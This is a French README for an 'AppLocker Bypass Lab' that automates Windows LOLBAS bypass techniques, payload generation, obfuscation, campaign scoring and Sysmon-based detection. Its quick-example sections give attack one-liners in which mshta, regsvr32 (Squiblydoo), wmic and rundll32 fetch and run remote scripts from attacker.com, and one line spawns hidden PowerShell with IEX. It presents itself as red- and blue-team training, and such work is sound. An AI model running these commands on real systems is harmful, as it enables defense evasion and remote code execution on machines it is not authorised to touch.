# 🛡️ AppLocker Bypass Lab

<div align="center">

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.8+-green.svg)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey.svg)
![License](https://img.shields.io/badge/license-Educational-orange.svg)

**Framework d'automatisation pour l'analyse et la compréhension des techniques de bypass AppLocker**

*Living Off The Land Binaries (LOLBAS) • MITRE ATT&CK • Red Team Education*

[🚀 Quick Start](#-installation-rapide) • [📖 Documentation](#-documentation-complète) • [🎯 Techniques](#-techniques-lolbas) • [⚠️ Legal](#%EF%B8%8F-avertissement-légal)

</div>

---

## ⚠️ AVERTISSEMENT LÉGAL
```
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚖️  USAGE ÉDUCATIF ET DÉFENSIF UNIQUEMENT                  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✅ Usages Autorisés:
   • Formation en cybersécurité et recherche académique
   • Tests dans des environnements de laboratoire contrôlés
   • Évaluation de configurations AppLocker sur vos propres systèmes
   • Red Team exercises avec autorisation explicite

❌ Usages Interdits:
   • Tests sur des systèmes sans autorisation écrite
   • Activités malveillantes ou illégales
   • Contournement de mesures de sécurité à des fins non autorisées

L'utilisateur est seul responsable de l'usage de ce framework.
Les auteurs déclinent toute responsabilité en cas d'usage abusif.
```

---

## 🎯 Vue d'Ensemble

**AppLocker Bypass Lab** est un framework pédagogique complet pour comprendre, tester et analyser les techniques de contournement AppLocker utilisant des binaires Windows légitimes (LOLBAS).

### 🌟 Fonctionnalités Principales

| 🔧 Automatisation | 📊 Dashboard | 🎓 MITRE ATT&CK | 🔍 Analyse |
|------------------|--------------|-----------------|------------|
| 12+ techniques LOLBAS | Interface Web Flask | Catalogue complet | Intégration Sysmon |
| Génération automatique | Statistiques temps réel | Référencement précis | Collection automatique |
| Obfuscation multicouche | Gestion de campagnes | Documentation détaillée | Scoring automatique |
| Packaging natif Windows | Visualisation résultats | Exemples d'utilisation | Rapports détaillés |

---

## 🚀 Installation Rapide

### Prérequis
```bash
Windows 10/11 (VM fortement recommandée)
Python 3.8+
PowerShell 5.1+
Droits administrateur (pour certaines fonctionnalités)
```

### Installation en 3 étapes
```bash
# 1. Cloner le repository
git clone https://github.com/your-repo/AppLockerBypassLab
cd AppLockerBypassLab

# 2. Installer les dépendances
pip install -r requirements.txt

# 3. Lancer le setup automatique
python scripts/setup_script.py
```

### Démarrage Ultra-Rapide
```bash
# Windows
quickstart.bat

# Linux/Mac
./quickstart.sh
```

---

## 📁 Architecture du Projet
```
AppLockerBypassLab/
│
├── 📂 payloads/                  # Payloads générés
│   ├── mshta/                    # HTML Applications
│   ├── regsvr32/                 # SCT Scripts
│   ├── rundll32/                 # DLL Proxies
│   ├── msbuild/                  # XML Projects
│   ├── installutil/              # .NET DLLs
│   ├── obfuscated/               # Payloads obfusqués
│   └── packaged/                 # Formats natifs
│
├── 📂 scripts/                   # Automation Scripts
│   ├── 🔧 generate_payloads.py   # Générateur
│   ├── 🎨 obfuscation_module.py  # Obfuscation
│   ├── 📦 packaging_module.py    # Packaging
│   ├── 🌐 web_dashboard.py       # Interface Web
│   ├── 📊 campaign_manager.py    # Gestion campagnes
│   ├── 🎯 mitre_attack_matrix.py # Mapping MITRE
│   └── 🔍 analyze_results.py     # Analyse
│
├── 📂 logs/                      # Logs collectés
│   ├── sysmon/                   # Événements Sysmon
│   └── applocker/                # Logs AppLocker
│
├── 📂 campaigns/                 # Campagnes de tests
├── 🗄️ lab_results.db            # Base de données SQLite
└── 📖 README.md                  # Documentation
```

---

## 🎯 Techniques LOLBAS

### Catalogue Complet

| 🔧 Binaire | 🎭 MITRE ATT&CK | 🛡️ Bypass AppLocker | 📝 Description |
|------------|-----------------|---------------------|----------------|
| **mshta.exe** | T1218.005 | ✅ | HTML Application avec VBScript/JScript |
| **regsvr32.exe** | T1218.010 | ✅ | Exécution de scripts SCT via COM |
| **rundll32.exe** | T1218.011 | ✅ | Chargement DLL et JavaScript proxy |
| **MSBuild.exe** | T1127.001 | ✅ | Compilation C# inline via XML |
| **InstallUtil.exe** | T1218.004 | ✅ | Exécution de DLLs .NET |
| **wmic.exe** | T1047 | ✅ | Exécution XSL et création processus |
| **cscript.exe** | T1059.005 | ✅ | Scripts VBScript/JScript |
| **wscript.exe** | T1059.007 | ✅ | Windows Script Host |
| **pubprn.vbs** | T1216.001 | ✅ | Proxy d'exécution de scripts |
| **mavinject.exe** | T1055.001 | ✅ | Injection DLL |
| **cmstp.exe** | T1218.003 | ✅ | Fichiers INF malveillants |
| **hh.exe** | T1218.001 | ✅ | Compiled HTML Help |

### Exemples Rapides

<details>
<summary><b>🔥 MSHTA.exe - HTML Application</b></summary>
```bash
# Exécution locale
mshta.exe payload.hta

# Exécution distante
mshta.exe http://attacker.com/payload.hta

# Inline VBScript
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe""")
```

**MITRE:** T1218.005 | **Détection:** Sysmon Event ID 1, 3

</details>

<details>
<summary><b>🔥 REGSVR32.exe - SCT Scripts</b></summary>
```bash
# Squiblydoo technique
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

# Local SCT
regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
```

**MITRE:** T1218.010 | **Détection:** Sysmon Event ID 1, 3, 7

</details>

<details>
<summary><b>🔥 MSBuild.exe - XML Project</b></summary>
```bash
# Compilation inline C#
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.xml
```

**MITRE:** T1127.001 | **Détection:** Sysmon Event ID 1, CommandLine monitoring

</details>

<details>
<summary><b>🔥 InstallUtil.exe - .NET DLL</b></summary>
```bash
# Exécution DLL .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

**MITRE:** T1218.004 | **Détection:** Sysmon Event ID 1, 7

</details>

<details>
<summary><b>🔥 WMIC.exe - XSL Execution</b></summary>
```bash
# Création de processus
wmic process call create "powershell.exe -nop -w hidden -c IEX(...)"

# XSL distant
wmic os get /FORMAT:"http://attacker.com/payload.xsl"
```

**MITRE:** T1047 | **Détection:** Sysmon Event ID 1, 3

</details>

<details>
<summary><b>🔥 RUNDLL32.exe - JavaScript Proxy</b></summary>
```bash
# JavaScript execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")

# DLL loading
rundll32.exe payload.dll,EntryPoint
```

**MITRE:** T1218.011 | **Détection:** Sysmon Event ID 1, 3, 7

</details>

---

## 🔧 Utilisation

### 1️⃣ Génération de Payloads
```bash
# Générer tous les types de payloads
python scripts/generate_payloads.py

# Résultat:
# ✅ payloads/mshta/payload.hta
# ✅ payloads/regsvr32/payload.sct
# ✅ payloads/msbuild/payload.xml
# ✅ payloads/installutil/payload.dll
# ✅ payloads/rundll32/payload.dll
# ... et bien plus
```

### 2️⃣ Obfuscation
```bash
# Obfusquer les payloads existants
python scripts/obfuscation_module.py
```

**Techniques disponibles:**
- ✅ **Base64** (simple et multicouche)
- ✅ **GZIP + Base64** (compression)
- ✅ **Concaténation** de chaînes
- ✅ **XOR encoding** (clé personnalisable)
- ✅ **String reversal** (inversion)
- ✅ **Variable renaming** (obfuscation)

**Exemple de sortie:**
```
🔐 OBFUSCATION PÉDAGOGIQUE - TECHNIQUES PUBLIQUES

[+] Base64 simple: payloads/obfuscated/01_base64_simple.ps1
[+] Base64 3 couches: payloads/obfuscated/02_base64_multi.ps1
[+] GZIP+Base64: payloads/obfuscated/03_gzip_b64.ps1
[+] String concat: payloads/obfuscated/04_concat.ps1
[+] Variables renommées: payloads/obfuscated/05_renamed.ps1
[+] XOR encodé: payloads/obfuscated/06_xor.ps1
[+] String inversé: payloads/obfuscated/07_reverse.ps1

✅ Tous les payloads obfusqués générés
```

### 3️⃣ Packaging
```bash
# Packager en formats natifs
python scripts/packaging_module.py
```

**Formats supportés:**
- 📦 **EXE** (compilé avec csc.exe)
- 📦 **DLL .NET** (pour InstallUtil.exe)
- 📦 **SCT** (pour regsvr32.exe)
- 📦 **HTA** (pour mshta.exe)
- 📦 **XML** (pour MSBuild.exe)
- 📦 **BAT** wrapper (pour cmd.exe)

### 4️⃣ Dashboard Web
```bash
# Lancer l'interface Web
python scripts/web_dashboard.py

# 🌐 Accès: http://localhost:5000
```

**Fonctionnalités du Dashboard:**

| Feature | Description |
|---------|-------------|
| 📊 **Statistiques** | Bypasses réussis, bloqués, taux de succès |
| 📈 **Graphiques** | Visualisation des résultats en temps réel |
| 📋 **Historique** | Liste complète des tests exécutés |
| 🎯 **Catalogue** | Documentation interactive LOLBAS |
| 🔄 **Auto-refresh** | Mise à jour automatique toutes les 5s |
| 🎨 **UI Moderne** | Interface responsive et intuitive |

**Captures d'écran:**
```
┌─────────────────────────────────────────────────────────┐
│  🛡️ AppLocker Bypass Lab                                │
│  Framework d'Automatisation de Tests LOLBAS            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  📊 BYPASSES RÉUSSIS    📊 BLOQUÉS    📊 TESTS TOTAUX  │
│         24                   8              32         │
│                                                         │
│  📊 TAUX DE SUCCÈS: 75%                                 │
│                                                         │
├─────────────────────────────────────────────────────────┤
│  [▶️ Lancer Tests] [🔧 Générer] [🔄 Actualiser]        │
└─────────────────────────────────────────────────────────┘
```

### 5️⃣ Gestion de Campagnes
```bash
# Créer une nouvelle campagne
python scripts/campaign_manager.py new "Test Q4 2024" "Campagne trimestrielle"

# Lancer la campagne
python scripts/campaign_manager.py run 1

# Voir le scorecard
python scripts/campaign_manager.py score 1

# Exporter le rapport JSON
python scripts/campaign_manager.py export 1

# Lister toutes les campagnes
python scripts/campaign_manager.py list
```

**Exemple de Scorecard:**
```
======================================================================
📊 SCORECARD - Campagne 1
======================================================================
Technique       Total    Bypass   Taux       Temps      Events
----------------------------------------------------------------------
mshta           10       8        80.0%      1.23s      15.4
regsvr32        8        6        75.0%      1.45s      18.2
rundll32        7        5        71.4%      1.67s      22.1
msbuild         5        4        80.0%      2.01s      12.5
installutil     6        5        83.3%      1.89s      14.8
wmic            4        3        75.0%      2.15s      19.3
cscript         9        7        77.8%      1.10s      11.2
======================================================================

Total campagne: 49 tests | 38 bypasses (77.6%)
Durée moyenne: 1.58s | Événements moyens: 15.1
```

### 6️⃣ Workflow Complet
```bash
# 1. Setup initial
python scripts/setup_script.py

# 2. Générer payloads
python scripts/generate_payloads.py

# 3. Obfusquer
python scripts/obfuscation_module.py

# 4. Packager
python scripts/packaging_module.py

# 5. Créer campagne
python scripts/campaign_manager.py new "Production Test"

# 6. Lancer dashboard
python scripts/web_dashboard.py

# 7. Exécuter tests (dans un autre terminal)
python scripts/campaign_manager.py run 1

# 8. Analyser résultats
python scripts/campaign_manager.py score 1

# 9. Exporter rapport
python scripts/campaign_manager.py export 1
```

---

## 🗺️ Mapping MITRE ATT&CK

### Génération du Mapping
```bash
python scripts/mitre_attack_matrix.py
```

**Fichiers générés:**
- `mitre_techniques.json` - Export JSON complet
- `MITRE_TECHNIQUES.md` - Documentation Markdown

### Tactiques Couvertes

| Tactique | ID | Techniques Implémentées | Couverture |
|----------|----|------------------------|------------|
| **Execution** | TA0002 | T1059.001, T1059.003, T1059.005, T1059.007, T1047 | ✅ 100% |
| **Defense Evasion** | TA0005 | T1218.001, T1218.003, T1218.004, T1218.005, T1218.007, T1218.009, T1218.010, T1218.011, T1127.001, T1216.001 | ✅ 100% |
| **Privilege Escalation** | TA0004 | T1055.001 | ⚠️ Partiel |

### Recherche par Technique
```python
from scripts.mitre_attack_matrix import MitreMapper

mapper = MitreMapper()

# Rechercher une technique
technique = mapper.get_technique("T1218.005")
print(technique['name'])  # System Binary Proxy Execution: Mshta

# Rechercher par outil
results = mapper.get_by_tool("mshta.exe")
for r in results:
    print(f"{r['id']}: {r['name']}")

# Obtenir tous les bypasses AppLocker
bypasses = mapper.get_applocker_bypasses()
print(f"Total: {len(bypasses)} techniques")
```

---

## 🔍 Détection et Analyse

### Configuration Sysmon
```powershell
# Installer Sysmon avec configuration SwiftOnSecurity
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip
.\Sysmon\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

### Événements Sysmon Clés

| Event ID | Description | Pertinence | Exemples |
|----------|-------------|------------|----------|
| **1** | Process Creation | 🔥 Critique | Détection de binaires LOLBAS |
| **3** | Network Connection | 🔥 Critique | Téléchargements distants |
| **7** | Image Loaded (DLL) | ⚠️ Important | Chargement de DLLs suspectes |
| **10** | Process Access | ⚠️ Important | Injection de processus |
| **11** | File Created | ℹ️ Informationnel | Création de payloads |
| **22** | DNS Query | ℹ️ Informationnel | Résolution DNS malveillante |

### Collection de Logs
```powershell
# Collection automatique
.\scripts\collect_logs.ps1 -Payload "test.hta"

# Logs générés dans:
# logs/20241123_143022-test.hta/sysmon.evtx
# logs/20241123_143022-test.hta/applocker.evtx
```

### Analyse Automatique
```bash
# Analyser les résultats collectés
python scripts/analyze_results.py

# Sortie:
# 📊 Analyse de 32 tests
# ✅ Bypasses: 24 (75%)
# ❌ Bloqués: 8 (25%)
# 📈 Événements Sysmon moyens: 15.4
# ⏱️ Temps d'exécution moyen: 1.58s
```

### Règles de Détection

**Exemple de règle Sigma:**
```yaml
title: MSHTA Suspicious Execution
status: experimental
description: Détecte l'exécution suspecte de mshta.exe
references:
    - https://attack.mitre.org/techniques/T1218/005/
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'javascript:'
            - 'vbscript:'
    condition: selection
falsepositives:
    - Legitimate HTA applications
level: high
tags:
    - attack.defense_evasion
    - attack.t1218.005
```

---

## 📊 Cas d'Usage

### 🎓 Formation Red Team

**Scénario: Évaluation des contrôles AppLocker**
```bash
# 1. Créer une campagne de test
python scripts/campaign_manager.py new "Red Team Assessment" "Évaluation complète"

# 2. Générer 50+ payloads variés
python scripts/generate_payloads.py
python scripts/obfuscation_module.py

# 3. Tester toutes les techniques LOLBAS
python scripts/campaign_manager.py run 1

# 4. Analyser les résultats
python scripts/campaign_manager.py score 1

# 5. Identifier les gaps de détection
python scripts/analyze_results.py
```

### 🛡️ Blue Team Defense

**Scénario: Amélioration de la détection**
```bash
# 1. Exécuter une campagne complète
python scripts/campaign_manager.py new "Detection Baseline"
python scripts/campaign_manager.py run 1

# 2. Collecter tous les événements Sysmon
.\scripts\collect_logs.ps1

# 3. Identifier les patterns d'attaque
python scripts/analyze_results.py --detailed

# 4. Créer des règles de détection personnalisées
# (Sigma, Splunk, QRadar, etc.)

# 5. Tester l'efficacité des nouvelles règles
python scripts/campaign_manager.py run 2
```

### 🔬 Recherche en Sécurité

**Scénario: Analyse comparative des techniques**
```bash
# 1. Créer plusieurs campagnes avec configurations différentes
python scripts/campaign_manager.py new "Baseline - No Protection"
python scripts/campaign_manager.py new "AppLocker Audit Mode"
python scripts/campaign_manager.py new "AppLocker Enforce Mode"

# 2. Comparer les taux de bypass
python scripts/campaign_manager.py run 1
python scripts/campaign_manager.py run 2
python scripts/campaign_manager.py run 3

# 3. Mesurer les performances
python scripts/campaign_manager.py score 1
python scripts/campaign_manager.py score 2
python scripts/campaign_manager.py score 3

# 4. Analyser la visibilité
# Comparer le nombre d'événements Sysmon générés

# 5. Publier les résultats
python scripts/campaign_manager.py export 1 --format pdf
```

---

## 🛠️ Configuration Avancée

### Environnement de Lab Recommandé
```yaml
VM Configuration:
  OS: Windows 10/11 Pro (build 19041+)
  RAM: 4GB minimum (8GB recommandé)
  CPU: 2 cores minimum (4 cores recommandé)
  Disk: 60GB
  Network: NAT ou Host-Only
  
Security Tools:
  - Sysmon v15+ (SwiftOnSecurity config)
  - AppLocker (Audit mode pour tests)
  - Windows Defender (Disabled temporairement)
  - .NET Framework 4.8
  
Network Configuration:
  - Isolated network segment
  - Internet access for payload downloads
  - Snapshot capability (VMware/Hyper-V/VirtualBox)
  
Monitoring:
  - Event Viewer configured
  - Sysmon logging enabled
  - AppLocker auditing active
```

### Configuration AppLocker
```powershell
# Mode Audit (recommandé pour tests)
Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy

# Vérifier la configuration
Get-AppLockerPolicy -Effective

# Activer les logs AppLocker
auditpol /set /subcategory:"Application Group Management" /success:enable /failure:enable

# Vérifier les événements
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 10
```

### Configuration Sysmon Avancée
```xml
<!-- sysmonconfig-custom.xml -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Process Creation - Capture LOLBAS -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">mshta.exe</Image>
      <Image condition="end with">regsvr32.exe</Image>
      <Image condition="end with">rundll32.exe</Image>
      <Image condition="end with">MSBuild.exe</Image>
      <Image condition="end with">InstallUtil.exe</Image>
      <Image condition="end with">wmic.exe</Image>
      <Image condition="end with">cscript.exe</Image>
      <Image condition="end with">wscript.exe</Image>
    </ProcessCreate>
    
    <!-- Network Connections -->
    <NetworkConnect onmatch="include">
      <Image condition="end with">mshta.exe</Image>
      <Image condition="end with">regsvr32.exe</Image>
      <Image condition="end with">rundll32.exe</Image>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

---

## 🔧 API REST

Le dashboard expose une API REST complète:

### Endpoints Disponibles

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/results` | GET | Récupérer tous les résultats |
| `/api/run_tests` | POST | Lancer une campagne de tests |
| `/api/add_result` | POST | Ajouter un résultat manuel |
| `/api/clear` | POST | Effacer tous les résultats |
| `/api/generate` | POST | Générer des payloads |
| `/api/analysis` | GET | Obtenir l'analyse statistique |
| `/api/campaign/new` | POST | Créer une nouvelle campagne |
| `/api/campaign/add_test` | POST | Ajouter un test à une campagne |
| `/api/register_test` | POST | Enregistrer un test |

### Exemples d'Utilisation
```bash
# Récupérer tous les résultats
curl http://localhost:5000/api/results

# Lancer une campagne
curl -X POST http://localhost:5000/api/run_tests

# Ajouter un résultat manuel
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "payload_name": "test.hta",
    "technique": "mshta",
    "status": "bypass",
    "sysmon_events": 15,
    "notes": "Test manuel"
  }' \
  http://localhost:5000/api/add_result

# Créer une campagne
curl -X POST -H "Content-Type: application/json" \
  -d '{"name": "Production Test"}' \
  http://localhost:5000/api/campaign/new

# Obtenir l'analyse
curl http://localhost:5000/api/analysis
```

---

## 📚 Documentation Complète

Pour une documentation exhaustive:

- 📖 [**Guide Complet**](scripts/complete_readme.md) - Documentation détaillée de 500+ lignes
- 🎯 [**Catalogue MITRE**](MITRE_TECHNIQUES.md) - Mapping complet ATT&CK
- 🔧 [**API Reference**](docs/API.md) - Documentation de l'API REST
- 🎓 [**Tutoriels**](docs/tutorials/) - Guides pas-à-pas
- 🔬 [**Recherche**](docs/research/) - Articles et analyses
- 🛡️ [**Détection**](docs/detection/) - Règles Sigma et YARA

---

## 🤝 Contribution

Les contributions sont les bienvenues! Pour contribuer:

1. Fork le projet
2. Créer une branche feature (`git checkout -b feature/AmazingFeature`)
3. Commit vos changements (`git commit -m 'Add AmazingFeature'`)
4. Push vers la branche (`git push origin feature/AmazingFeature`)
5. Ouvrir une Pull Request

### Domaines de Contribution

- 🆕 **Nouvelles techniques LOLBAS** - Ajouter des binaires non documentés
- 🐛 **Corrections de bugs** - Améliorer la stabilité
- 📝 **Documentation** - Enrichir les guides
- 🎨 **UI/UX** - Améliorer l'interface du dashboard
- 🔍 **Détection** - Créer de nouvelles règles Sigma/YARA
- 🧪 **Tests** - Ajouter des tests unitaires
- 🌐 **Internationalisation** - Traduire la documentation

### Guidelines

- Suivre les conventions de code Python (PEP 8)
- Documenter toutes les nouvelles fonctionnalités
- Inclure des tests pour les nouvelles techniques
- Respecter l'esprit éducatif du projet

---

## 🐛 Troubleshooting

<details>
<summary><b>❌ Erreur: "Module flask not found"</b></summary>
```bash
# Solution
pip install --upgrade flask requests

# Vérifier l'installation
python -c "import flask; print(flask.__version__)"
```

</details>

<details>
<summary><b>❌ Dashboard ne démarre pas</b></summary>
```bash
# Vérifier le port 5000
netstat -ano | findstr :5000

# Si le port est occupé, utiliser un port alternatif
# Modifier dans web_dashboard.py:
# app.run(host='0.0.0.0', port=8080, debug=True)

#Relancer le dashboard
python scripts/web_dashboard.py</details><details>
<summary><b>❌ AppLocker bloque tout</b></summary>

powershell# Passer en mode Audit
Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy

# Vérifier la configuration
Get-AppLockerPolicy -Effective

# Redémarrer le service AppLocker
Restart-Service AppIDSvc

# Vérifier les logs
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 50</details><details>
<summary><b>❌ Erreur: "Permission denied" lors de l'exécution</b></summary>